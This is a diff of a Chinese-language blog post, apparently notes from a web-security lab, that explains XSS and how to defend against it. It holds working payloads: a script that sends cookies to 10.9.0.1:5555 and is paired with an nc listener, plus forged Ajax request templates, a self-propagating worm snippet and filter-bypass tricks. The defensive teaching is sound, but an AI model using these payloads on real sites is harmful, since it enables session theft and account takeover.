@@ -16,23 +16,23 @@
   <meta name="author" content="Haoran Li">
   <meta name="keywords" content="">
   
-    <meta name="description" content="跨站脚本攻击（XSS）：漏洞介绍对于任何将用户输入作为返回用户的页面上的用来显示的地方，均有可能产生XSS。其本质是用户的输入本应该作为数据的一部分，但是在一些特殊情况下被当作页面的代码执行。 XSS的利用可以做到javascript可以做的任何事情。例如可以盗取cookie，进而使用这个cookie进行恶意操作。还可以制作蠕虫病毒进行自我复制。 这种漏洞时由用户输入引发的。例如，一些应用中用户">
+    <meta name="description" content="跨站脚本攻击（XSS）漏洞介绍很多Web应用需要将用户的输入显示在后续的页面中。例如，我们注册一个账号，其中昵称&#x2F;用户名将会显示在登陆后的页面中。 对于任何将用户输入作为返回用户的页面上的用来显示的地方，均有可能产生XSS。其本质是用户的输入本应该作为数据的一部分，但是在一些特殊情况下恶意构造的输入不再被当作数据显示，而是被当作一段代码被客户端的浏览器执行。 XSS的利用可以做到jav">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XSS vulnerability">
 <meta property="og:url" content="https://lihaoran8001.github.io/2022/04/15/WebSec/index.html">
-<meta property="og:site_name" content="XXXSec">
-<meta property="og:description" content="跨站脚本攻击（XSS）：漏洞介绍对于任何将用户输入作为返回用户的页面上的用来显示的地方，均有可能产生XSS。其本质是用户的输入本应该作为数据的一部分，但是在一些特殊情况下被当作页面的代码执行。 XSS的利用可以做到javascript可以做的任何事情。例如可以盗取cookie，进而使用这个cookie进行恶意操作。还可以制作蠕虫病毒进行自我复制。 这种漏洞时由用户输入引发的。例如，一些应用中用户">
+<meta property="og:site_name" content="1nt3rva1&#39;s personal blog">
+<meta property="og:description" content="跨站脚本攻击（XSS）漏洞介绍很多Web应用需要将用户的输入显示在后续的页面中。例如，我们注册一个账号，其中昵称&#x2F;用户名将会显示在登陆后的页面中。 对于任何将用户输入作为返回用户的页面上的用来显示的地方，均有可能产生XSS。其本质是用户的输入本应该作为数据的一部分，但是在一些特殊情况下恶意构造的输入不再被当作数据显示，而是被当作一段代码被客户端的浏览器执行。 XSS的利用可以做到jav">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://lihaoran8001.github.io/2022/04/15/WebSec/web.jpg">
 <meta property="article:published_time" content="2022-04-15T19:23:47.000Z">
-<meta property="article:modified_time" content="2022-04-15T21:22:46.220Z">
+<meta property="article:modified_time" content="2022-04-16T09:05:43.509Z">
 <meta property="article:author" content="Haoran Li">
 <meta property="article:tag" content="Web安全漏洞介绍">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://lihaoran8001.github.io/2022/04/15/WebSec/web.jpg">
   
   
-  <title>XSS vulnerability - XXXSec</title>
+  <title>XSS vulnerability - 1nt3rva1&#39;s personal blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -212,7 +212,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3k 字
+          3.1k 字
         
       </span>
     
@@ -274,28 +274,35 @@
             <div class="markdown-body">
               
               <img src="/2022/04/15/WebSec/web.jpg" srcset="/img/loading.gif" lazyload class="" title="WEB Security">
-<h2 id="跨站脚本攻击（XSS）："><a href="#跨站脚本攻击（XSS）：" class="headerlink" title="跨站脚本攻击（XSS）："></a>跨站脚本攻击（XSS）：</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>对于任何将用户输入作为返回用户的页面上的用来显示的地方，均有可能产生XSS。其本质是用户的输入本应该作为数据的一部分，但是在一些特殊情况下被当作页面的代码执行。</p>
+<h2 id="跨站脚本攻击（XSS）"><a href="#跨站脚本攻击（XSS）" class="headerlink" title="跨站脚本攻击（XSS）"></a>跨站脚本攻击（XSS）</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>很多Web应用需要将用户的输入显示在后续的页面中。例如，我们注册一个账号，其中昵称&#x2F;用户名将会显示在登陆后的页面中。</p>
+<p>对于任何将用户输入作为返回用户的页面上的用来显示的地方，均有可能产生XSS。其本质是用户的输入本应该作为数据的一部分，但是在一些特殊情况下恶意构造的输入不再被当作数据显示，而是被当作一段代码被客户端的浏览器执行。</p>
 <p>XSS的利用可以做到javascript可以做的任何事情。例如可以盗取cookie，进而使用这个cookie进行恶意操作。还可以制作蠕虫病毒进行自我复制。</p>
-<p>这种漏洞时由用户输入引发的。例如，一些应用中用户输入可以展示给自己，也可以展示给别人，所以常见于社交媒体，留言系统等网站。</p>
+<p>这种漏洞是由用户输入引发的。尤其在一些用户的输入既可以展示给自己，也可以展示给别人的应用中危害更大。所以常见于社交媒体，留言系统等网站。</p>
 <h3 id="漏洞利用方法"><a href="#漏洞利用方法" class="headerlink" title="漏洞利用方法"></a>漏洞利用方法</h3><ol>
-<li><p>使用 <code>alert</code> 函数进行弹窗。</p>
-</li>
+<li>使用 <code>alert</code> 函数进行弹窗，没什么实际作用（恐吓？）。我有时候会用 <code>alert</code> 来调试payload。</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;nmsl&#x27;</span>);&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<ol start="2">
 <li><p>使用 <code>document.cookie</code> 读取cookie。</p>
 </li>
-<li><p>使用如下代码用GET方法将cookie发送到指定主机，escape函数用来编码。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(’&lt;img src=<span class="hljs-attr">http</span>:<span class="hljs-comment">//10.9.0.1:5555?c=’</span><br>                       + <span class="hljs-built_in">escape</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>) + ’   &gt;’);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></li>
+<li><p>使用如下代码在DOM中嵌入一个对img的加载，从而用GET方法将cookie发送到指定主机，escape函数用来编码。</p>
+</li>
 </ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(’&lt;img src=<span class="hljs-attr">http</span>:<span class="hljs-comment">//10.9.0.1:5555?c=’</span><br>                       + <span class="hljs-built_in">escape</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>) + ’   &gt;’);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
 <p>对应的，在需要接收的主机上开启 <code>nc</code> ，<code>-l</code> 表示listen模式，<code>-nv</code> 表示给出更多输出，<code>-k</code> 表示当结束一次连接以后，继续监听下一次。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lknv 5555<br></code></pre></td></tr></table></figure>
 
 <ol start="4">
-<li>通过Ajax发送伪造请求，GET以及POST请求都可以进行发送，demo如下。</li>
+<li>通过Ajax在受害者的浏览器上发送伪造请求，GET以及POST请求都可以进行发送，这种攻击不需要访问受害者的cookie，因为代码运行在受害者的浏览器，进行发送时，浏览器会自动将cookie附加在请求头中。</li>
 </ol>
-<p>GET请求：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;<br><span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_ts</span>; <br><span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_token</span>;  <span class="hljs-comment">//Construct the HTTP request to add Samy as a friend.</span><br><span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.xxx.com?&quot;</span>+ts+token;  <span class="hljs-comment">//FILL IN</span><br><span class="hljs-comment">//Create and send Ajax request to add friend</span><br><span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>  <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br>  <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>();<br>&#125; <br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<p>GET请求：（注意：GET请求的参数用 <code>&amp;</code> 符号连接在url后面）</p>
+<p>使用 <code>window.onload</code> 函数是要在当前页面加载完毕之后再执行这个函数。因为如果没有加载完毕，DOM还没有构造好，一些参数可能还没有初始化而导致攻击失败。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;<br><span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;param1=&quot;</span>+p1; <br><span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;param2=&quot;</span>+p2;  <span class="hljs-comment">//Construct the HTTP request</span><br><span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.xxx.com?&quot;</span>+ts+token;  <span class="hljs-comment">//FILL IN</span><br><span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br><span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br><span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>();<br>&#125; <br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
 
-<p>POST请求：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-comment">//JavaScript code to access user name, user guid, Time Stamp __elgg_ts</span><br>  <span class="hljs-comment">//and Security Token __elgg_token</span><br><span class="hljs-keyword">var</span> userName=<span class="hljs-string">&quot;&amp;name=&quot;</span>+elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">name</span>;<br><span class="hljs-keyword">var</span> guid=<span class="hljs-string">&quot;&amp;guid=&quot;</span>+elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">guid</span>;<br><span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_ts</span>;<br><span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_token</span>;<br><span class="hljs-comment">//Construct the content of your url.</span><br><span class="hljs-keyword">var</span> content=...;<br><span class="hljs-keyword">var</span> samyGuid=...;<br><span class="hljs-keyword">var</span> sendurl=...;<br><span class="hljs-comment">//FILL IN</span><br><span class="hljs-comment">//FILL IN</span><br><span class="hljs-comment">//FILL IN</span><br><span class="hljs-keyword">if</span>(elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">guid</span>!=samyGuid) &#123;<br>   <span class="hljs-comment">//Create and send Ajax request to modify profile</span><br>   <span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;<br>   <span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>   <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br>	 <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>,<br>                           <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>   <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>(content);<br>  &#125;<br>&#125; &lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<p>POST请求：（POST请求的参数需要放在content区域）</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-comment">//JavaScript code to access param</span><br><span class="hljs-keyword">var</span> userName=<span class="hljs-string">&quot;&amp;p1=&quot;</span>+p1;<br><span class="hljs-keyword">var</span> guid=<span class="hljs-string">&quot;&amp;p2=&quot;</span>+p2;<br><span class="hljs-comment">//Construct the content of your url.</span><br><span class="hljs-keyword">var</span> content=...;<br><span class="hljs-keyword">var</span> sendurl=...;<br><span class="hljs-comment">//FILL IN</span><br><span class="hljs-comment">//Create and send Ajax request</span><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;<br><span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br><span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br><span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>,<br>                      <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br><span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>(content);<br>&#125; &lt;/script&gt;<br></code></pre></td></tr></table></figure>
 
 <ol start="5">
 <li>使用DOM中的方法构造蠕虫。</li>
@@ -303,7 +310,7 @@
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script id=<span class="hljs-string">&quot;worm&quot;</span>&gt;<br><span class="hljs-keyword">var</span> headerTag = <span class="hljs-string">&quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;</span>;  <br><span class="hljs-keyword">var</span> jsCode = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;worm&quot;</span>).<span class="hljs-property">innerHTML</span>;  <br><span class="hljs-keyword">var</span> tailTag = <span class="hljs-string">&quot;&lt;/&quot;</span> + <span class="hljs-string">&quot;script&gt;&quot;</span>; <br><span class="hljs-keyword">var</span> wormCode = <span class="hljs-built_in">encodeURIComponent</span>(headerTag + jsCode + tailTag); <br><span class="hljs-title function_">alert</span>(jsCode);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
 
 <ol start="6">
-<li>获取用户信息</li>
+<li>收集用户信息（除了cookie以外）</li>
 </ol>
 <p>识别浏览器：最直接的方法就是读取浏览器的userAgent对象</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">alert</span>(navigator.<span class="hljs-property">userAgent</span>);<br></code></pre></td></tr></table></figure>
@@ -312,18 +319,25 @@
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">alert</span>(navigator.<span class="hljs-property">plugins</span>[<span class="hljs-number">0</span>].<span class="hljs-property">name</span>);<br></code></pre></td></tr></table></figure>
 
 <p>获取用户的用户IP地址：<br>如果用户安装的JRE环境，就可以通过调用JavaApplet接口获取本地IP地址，也可以获取外网IP地址。</p>
+<p>XSS钓鱼：利用js在当前页面上画出一个登录框，诱导用户去输入正确的凭据，然后发送至黑客的服务器上。</p>
 <ol start="7">
 <li>Payload构造技巧：</li>
 </ol>
 <p>利用字符编码：对于使用GBK&#x2F;GB2312编码的字符，可以使用<code>%c1</code>绕过对双引号的转义。因为<code>%c1\</code> 会被解析成为一个unicode字符。	</p>
-<p>绕过长度限制：调用远程js文件&#x2F;使用注释符打通两个input框。</p>
-<p>利用相对路径：使用<code>&lt;base&gt;</code>标签，将使用相对路径的资源&#x2F;脚本进行劫持。</p>
+<p>绕过长度限制：调用远程js文件；如果有两处XSS的话，可以使用注释符打通两个input框。</p>
+<p>利用相对路径：使用 <code>&lt;base&gt;</code> 标签，将使用相对路径的资源&#x2F;脚本进行劫持。</p>
 <h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ol>
-<li><p>HttpOnly方法：简单来说，就是服务器在返回cookie时，将cookie设置了HttpOnly标签，使得javascript代码无法读取cookie值。但是严格来说其实这个方法并不是防御XSS的，而是防御XSS漏洞发生后的利用过程。虽然此时javascript无法读取到cookie，但是还是可以向同源的网址用ajax请求来进行模拟POST&#x2F;GET过程。</p>
+<li><p>HttpOnly方法</p>
+<p>简单来说，就是服务器在返回cookie时，将cookie设置了HttpOnly标签，使得javascript代码无法读取cookie值。但是严格来说其实这个方法并不是防御XSS的，而是防御XSS漏洞发生后的利用过程。虽然此时javascript无法读取到cookie，但是还是可以向同源的网址用ajax请求来进行模拟POST&#x2F;GET过程。</p>
 </li>
-<li><p>转义 比如将标签 <code>&lt; &gt;</code> 转化成 <code>&amp;lt &amp;gt</code> 。</p>
+<li><p>输入检查</p>
+<p>前端js检查：可以阻挡大部分误操作的正常用户，但是可以被绕过。<br>后端检查：特殊字符的过滤&#x2F;编码，敏感词黑名单。</p>
 </li>
-<li><p>使用CSP(Content Security Policy) 可以指定带有特定 <code>nonce</code> 的script代码块才可以被执行，或者指定源的js代码才可以被执行。</p>
+<li><p>输出检查</p>
+<p>比如将标签 <code>&lt; &gt;</code> 转化成 <code>&amp;lt &amp;gt</code>；<br><code>&amp;</code> 转化为 <code>&amp;amp</code>；<br><code>&quot;</code> 转化为 <code>&amp;quot</code>；<br><code>&#39;</code> 转化为 <code>&amp;#x27</code>；</p>
+</li>
+<li><p>使用CSP(Content Security Policy)</p>
+<p>服务器在返回的Header中可以指定只有带特定 <code>nonce</code> 的script代码块才可以被执行，或者指定源的js代码才可以被执行。</p>
 </li>
 </ol>
 
